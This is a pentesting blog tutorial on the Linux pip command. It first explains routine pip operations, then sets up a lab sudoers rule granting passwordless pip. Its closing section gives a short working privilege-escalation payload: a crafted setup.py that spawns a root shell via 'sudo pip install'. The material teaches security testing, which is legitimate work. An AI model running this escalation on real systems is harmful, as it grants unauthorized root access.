<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux for Pentester: pip Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2019-07-08T16:16:55+00:00">July 8, 2019</time><time class="updated" datetime="2025-06-07T13:56:00+00:00">June 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">The main objective of this article is to make attentive our readers for the other most expedient command from the list of Linux for pentesters. As we know apart from copying, downloading and searching task user desires other excessive operational mission i.e. installation of packages. So in this article, we are going to make you familiar with the command that can perform such task i.e. “pip”. The main utilities of this command are to install, uninstall, search python packages. So by knowing this functionality of pip command now, we will check how we can acquire its benefit in our mission of Privilege Escalation.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;"><strong><em>NOTE: “The main objective of publishing the series of ‘Linux for pentester’ is to introduce the circumstances and any kind of hurdles that can be faced by any pentester while solving CTF challenges or OSCP labs which are based on Linux privilege escalations. Here we do not criticize any kind of misconfiguration that a network or system administrator does for providing higher permissions on any programs/binaries/files &amp; etc.”  </em></strong></span></p>
<h3 class="ai-optimize-8"><span style="color: #800000;">Table of Content</span></h3>
<p class="ai-optimize-9"><span style="color: #000000;"><strong>Introduction to pip                                         </strong></span></p>
<ul>
<li class="ai-optimize-10"><span style="color: #000000;">Major Operation performed using pip</span></li>
</ul>
<p class="ai-optimize-11"><span style="color: #000000;"><strong>Exploiting pip</strong></span></p>
<ul>
<li class="ai-optimize-12"><span style="color: #000000;">SUID Lab setups for privilege Escalation</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Exploiting SUID</span></li>
</ul>
<h3 class="ai-optimize-14"><span style="color: #800000;">Introduction to pip</span></h3>
<p class="ai-optimize-15"><span style="color: #000000;">Before we start, let’s do a quick appendix check and determine what a ‘Python package’ is in actually. It is a Python module that can contain other modules or, recursively, other packages. It is the kind of Python package that you import in your Python code. So there are many tools available that help to install such packages and “pip” is one of that which is widely used in today’s era.</span></p>
<p class="ai-optimize-16"><span style="color: #000000;">The pip is an abbreviation of “Python Install Packages” which is a tool for installing and managing Python packages. This command is very useful for web development as well as for sys-admins who manages cloud computing-based resources. Now we will start by running its help command to know the depth of “pip” operations.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip --help</pre>
<p class="ai-optimize-17"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QYSrdHfWty0/XSNp9Q_goiI/AAAAAAAAfE4/I0f6eYiE4IkSREx_-6V-7HRwxlSDTgAqgCLcBGAs/s1600/1.png"/></span></p>
<h4 class="ai-optimize-18"><span style="color: #800000;"><u>Major operations performed by “pip”</u></span></h4>
<p class="ai-optimize-19"><span style="color: #000000;"><strong>List all installed packages</strong>: To begin with, to check the list of all installed Python packages on our machine, we can use the “list” option followed by the pip command. Notably, the list option plays a vital role in the pip command, as it can perform many operations that a user might require. For example, some of these functions are listed below:</span></p>
<ul>
<li class="ai-optimize-20"><span style="color: #000000;"><em><u>List installed packages</u></em>: This will help in listing all the installed packages.</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip list</pre>
<p class="ai-optimize-21"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-aKiWi0M6sN0/XSNp-pAJxPI/AAAAAAAAfFE/RVGH01UQ_OwLoy4HuWMthroJvqHk3u_4QCLcBGAs/s1600/2.png"/></strong></span></p>
<h4 class="ai-optimize-22"><span style="color: #800000;"><u>Other option for package listing</u>:</span></h4>
<p class="ai-optimize-23"><span style="color: #000000;"><strong>Syntax: pip list  &lt;options&gt;</strong></span></p>
<p class="ai-optimize-24"><span style="color: #000000;"><em><u>List outdated packages:</u></em> Whenever we wish to check the list for all those packages that are outdated then we will use “–outdated” option followed by pip list command which will provide the list of all installed outdated packages with its current and latest version.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip list --outdated</pre>
<p class="ai-optimize-25"><span style="color: #000000;"><em><u>List installed packages with column formatting:</u></em> If we want to display the desired output in a specific format, then we will use the “–format” option for this purpose. Suppose I want to wish to list the details in column format then I will frame command as below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip list --format columns</pre>
<p class="ai-optimize-26"><span style="color: #000000;"><em><u>List outdated packages with column formatting:</u></em> This is same as format option consisting some more fields to display the output as the current version, latest version, and type of installed packages.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip list -o --format columns</pre>
<p class="ai-optimize-27"><span style="color: #000000;"><em><u>List packages that are not dependencies of other packages: </u></em>whenever anybody required to check the list for those installed packages who do not have any kind of responsibleness of other packages then we will frame command as below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip list --outdated --not-required</pre>
<p class="ai-optimize-28"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sg9J-2X1m_c/XSNp-jBed7I/AAAAAAAAfFI/-rzl95mqqeUHmIHhugR3cKtiqtQ3S7yXQCLcBGAs/s1600/3.png"/></span></p>
<p class="ai-optimize-29"><span style="color: #000000;"><strong>To install the new package</strong>: As above I have described the main objective of pip command is “installing new packages” so now by grabbing this advantage I am installing ‘flask”.</span></p>
<h5 class="ai-optimize-30"><span style="color: #000000;"><strong>Syntax: pip install &lt;package name&gt;</strong></span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip install flask</pre>
<p class="ai-optimize-31"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XoU-OrBZDTo/XSNp_IradWI/AAAAAAAAfFM/BtRlAdClpPgy1npc8Sqt6sjyFa56KSRBQCLcBGAs/s1600/4.png"/></span></p>
<p class="ai-optimize-32"><span style="color: #000000;"><strong>Show information about packages</strong>: The “show” option in pip assist to reflects the detailed information about installed packages.</span></p>
<h5 class="ai-optimize-33"><span style="color: #000000;"><strong>Syntax: pip show &lt;package name&gt;</strong></span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip show flask</pre>
<p class="ai-optimize-34"><span style="color: #000000;">As illustrated in the image below, it can be clearly understood that after using the show option, it produced the output by displaying the relevant information about Flask.</span></p>
<p class="ai-optimize-35"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F9Nb8sVQ9mk/XSNp_GjWSeI/AAAAAAAAfFQ/Ru57XyyDDXgPtVqAJMoAHt--qIIW2xHnwCLcBGAs/s1600/5.png"/></span></p>
<p class="ai-optimize-36"><span style="color: #000000;"><strong>To uninstall any package: </strong>Apart from installing the software packages, we also require its other phase i.e., uninstallation. The pip command tends this utility too where one can uninstall the desired packages without any hassle.</span></p>
<h5 class="ai-optimize-37"><span style="color: #000000;"><strong>Syntax: pip uninstall &lt;package name&gt;</strong></span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip uninstall jinja2</pre>
<p class="ai-optimize-38"><span style="color: #000000;">Here in the image below, I’m showing to uninstall “jinja2” which is a modern-day templating language for Python developers.</span></p>
<p class="ai-optimize-39"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aeigyxV9hnc/XSNp_qLCvUI/AAAAAAAAfFU/u4y1DvPfsYwPC1UKQrsCiICHNEtl0jerQCLcBGAs/s1600/6.png"/></span></p>
<p class="ai-optimize-40"><span style="color: #000000;"><strong>To freeze any package</strong>:  Freezing is a procedure where pip reads the versions of all installed packages in a local virtual atmosphere and then produces a text file with the package version for each python package stated. For performing this operation use option “freeze” as shown below.</span></p>
<h5 class="ai-optimize-41"><span style="color: #000000;"><strong>Syntax: pip freeze &gt; &lt;filename&gt;</strong></span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip freeze &gt; komal.txt</pre>
<p class="ai-optimize-42"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jvv1Iv2Kurg/XSNp_2Dto4I/AAAAAAAAfFY/osdKgv_qut4wH4eQ-OL4RdYEPYITQPrmACLcBGAs/s1600/7.png"/></span></p>
<p class="ai-optimize-43"><span style="color: #000000;"><strong>To search for an installed package</strong>: The search option helps to search for an available Python package. The search term generates quite a widespread group of packages.</span></p>
<h5 class="ai-optimize-44"><span style="color: #000000;"><strong>Syntax: pip search &lt;package name&gt;</strong></span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip search keyring</pre>
<p class="ai-optimize-45"><span style="color: #000000;">Most of the time, we wish to hunt for packages directly on the <a style="color: #000000;" href="https://pypi.org/">PyPI</a> website. So PyPI delivers such search abilities for its index and a way to filter results.  Now I’m framing the command as shown below to search for “keyring”.</span></p>
<p class="ai-optimize-46"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-1UWTu5GQszY/XSNqAT34T3I/AAAAAAAAfFc/x7CvekeJ9YwKG1lDA3jtgro0k8NyB_PpwCLcBGAs/s1600/9.png"/></strong></span></p>
<p class="ai-optimize-47"><span style="color: #000000;"><strong>To create a hash for any package</strong>: A Hash Value is a string value of specific length which is the result of calculation of a Hashing Algorithm. One of the chief uses of Hash Values is to define the Integrity of any Data (which can be a file, attachments, downloads etc).</span></p>
<h5 class="ai-optimize-48"><span style="color: #000000;"><strong>Syntax: pip hash &lt;package name&gt;</strong></span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip hash rockyou.txt</pre>
<p class="ai-optimize-49"><span style="color: #000000;">The pip provides this functionality too to maintain the integrity of installed packages. In below image, I’m using this option for creating hash value of a file i.e. “rockyou.txt.</span></p>
<p class="ai-optimize-50"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lSIWnuoIt-o/XSNp9ce1t8I/AAAAAAAAfE0/e_T4pUV1J8o7zrNeIfqzqRq7pr4_3XlNwCLcBGAs/s1600/10.png"/></span></p>
<p class="ai-optimize-51"><span style="color: #000000;"><strong>To download any file or package</strong>: Instead of above all described task “pip” also supports the functionality to upload, download, read etc. for any file. Here I’m using one of these i.e. download the package. Pip download use to download file and package into default path or can do the same for a specific path.</span></p>
<p class="ai-optimize-52"><span style="color: #000000;">In below image I have used this to download a compressed file from remote location.</span></p>
<h5 class="ai-optimize-53"><span style="color: #000000;"><strong>Syntax: pip download &lt;path&gt; </strong></span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip download http://192.168.1.10:8000/5622.tar.bz2</pre>
<p class="ai-optimize-54"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_UFitSZ0RVo/XSNp9De6IYI/AAAAAAAAfEw/Q2xwoa9YLLYK97kz-MQjRYytHkEIFDmNgCLcBGAs/s1600/11.png"/></span></p>
<h3 class="ai-optimize-55"><span style="color: #800000;">Exploiting pip</span></h3>
<h4 class="ai-optimize-56"><span style="color: #800000;">Sudo Rights Lab setups for Privilege Escalation</span></h4>
<p class="ai-optimize-57"><span style="color: #000000;">Then we will start our task of privilege escalation. For this very first we have to set up our lab of pip command with administrative rights. After that, we will check for the pip command and what influence it has after getting sudo rights and how we can use it more for privilege escalation.</span></p>
<p class="ai-optimize-58"><span style="color: #000000;">It can be clearly understood by the below image in which I have created a local user (test) who own all sudo rights as root and can achieve all task as admin.</span></p>
<p class="ai-optimize-59"><span style="color: #000000;">To add sudo right open etc/sudoers file and type following as user Privilege specification.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">test All=(root) NOPASSWD: /usr/bin/pip</pre>
<p class="ai-optimize-60"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-I6r8ppRaImY/XSNp91KEZmI/AAAAAAAAfE8/rBJWXgQZb3Ac31Sq_LmpYmqlUGhp_Km0wCLcBGAs/s1600/12.png"/></span></p>
<h4 class="ai-optimize-61"><span style="color: #800000;">Exploiting Sudo rights</span></h4>
<p class="ai-optimize-62"><span style="color: #000000;">Now that we have initiated the exploitation phase, we will start exploiting the pip service by taking advantage of the sudoer’s permissions. Suppose we have obtained a session on the victim’s machine; this access will assist us in gaining local user privileges on the targeted system, through which we can escalate to root user rights.</span></p>
<p class="ai-optimize-63"><span style="color: #000000;">Very first we will connect to the target machine with ssh, therefore, type the following command to get access through local user login.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh test@192.168.1.108</pre>
<p class="ai-optimize-64"><span style="color: #000000;">Then we look for sudo right of “test” user (if given) and found that user “test” can execute the pip command as “root” without a password.</span></p>
<pre class="lang:default decode:true">sudo -l</pre>
<p class="ai-optimize-65"><span style="color: #000000;">Now after knowing the fact that test user attains admin rights so, taking this benefit here we can use pip command to run in privileged context and can be used to access the file system, escalate or maintain access with higher privileges if permitted on sudo.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')" &gt; $TF/setup.py
sudo pip install $TF</pre>
<p class="ai-optimize-66"><span style="color: #000000;"><strong>Conclusion</strong>: Hence, we have successfully exploited pip by achieving its functionality after granting higher privilege.  </span></p>
<p class="ai-optimize-67"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-K_oI3GX6h0A/XSNp-cVvn5I/AAAAAAAAfFA/kbklsU59e50MBU7vwyacqrT96fD2zBtEQCLcBGAs/s1600/13.png"/></strong></span></p>
<p class="ai-optimize-68"><span style="color: #000000;">Reference link: https://gtfobins.github.io</span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To Learn more about Privilege Escalation. Follow this</span> <a href="https://www.hackingarticles.in/category/privilege-escalation/">Link.</a></p>
<p class="ai-optimize-69"><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer. She is a completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/komal-rajput-26b783131/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
